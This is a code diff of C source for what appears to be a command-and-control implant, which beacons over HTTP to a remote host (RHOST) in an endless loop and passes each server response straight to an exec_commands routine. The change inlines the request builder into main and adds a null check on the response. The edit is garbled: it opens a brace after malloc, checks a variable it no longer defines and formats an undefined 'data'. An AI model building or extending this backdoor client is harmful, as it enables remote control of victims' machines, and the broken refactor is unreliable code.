@@ -71,21 +71,6 @@ int connect_to_c2(const char *host, int port)
 	return sockfd;
 }
 
-#define HTTP_REQ_MAX_SIZE 2048
-
-char *build_http_request(char *data)
-{
-	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
-
-	if (http_req != NULL) {
-		sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
-			"Host: " RHOST ":" RPORT_STR "\r\n"
-			"Content-Length: %d\r\n\r\n%s", strlen(data), data);
-	}
-
-	return http_req;
-}
-
 char *get_beacon_resp(int sockfd)
 {
 	char *buf = calloc(BEACON_RESP_MAX_SIZE, sizeof(char));
@@ -158,6 +143,8 @@ int send_beacon(int sockfd, char *request, size_t request_len)
 
 int main(int argc, char *argv[])
 {
+#define HTTP_REQ_MAX_SIZE 2048
+
 	printf("[*] Acquiring beacon...");
 	char *beacon = get_beacon();
 	if (beacon == NULL) {
@@ -167,11 +154,14 @@ int main(int argc, char *argv[])
 	printf(GREEN("done:\n") "%s", beacon);
 
 	printf("[*] Building HTTP request...");
-	char *http_request = build_http_request(beacon);
+	char *http_req = malloc(HTTP_REQ_MAX_SIZE) {
 	if (http_request == NULL) {
 		printf(RED("failed\n"));
 		return -1;
 	}
+	sprintf(http_req, "GET /beacon/ HTTP/1.1\r\n"
+			"Host: " RHOST ":" RPORT_STR "\r\n"
+			"Content-Length: %d\r\n\r\n%s", strlen(data), data);
 	printf(GREEN("done\n"));
 
 	while (1) {
@@ -200,16 +190,16 @@ int main(int argc, char *argv[])
 			fflush(stdout);
 			sleep(timeout);
 			printf("done\n");
-		} else {	//if (response != NULL) {
+		} else {
 			char *response = get_beacon_resp(sockfd);
-			/* If the response is empty or invalid, you might wanna check
-			   it here and skip the call to exec_commands */
-			printf("[*] Server response:\n%s\n", response);
-			printf(BLUE("[*] Moving to execution subsystem\n"));
-			exec_commands(response);
-			printf(BLUE("[*] Exiting executing subsystem\n"));
-			free(response);
-			sleep(timeout);
+			if (response) {
+				printf("[*] Server response:\n%s\n", response);
+				printf(BLUE("[*] Moving to execution subsystem\n"));
+				exec_commands(response);
+				printf(BLUE("[*] Exiting executing subsystem\n"));
+				free(response);
+				sleep(timeout);
+			}
 		}
 	}
 
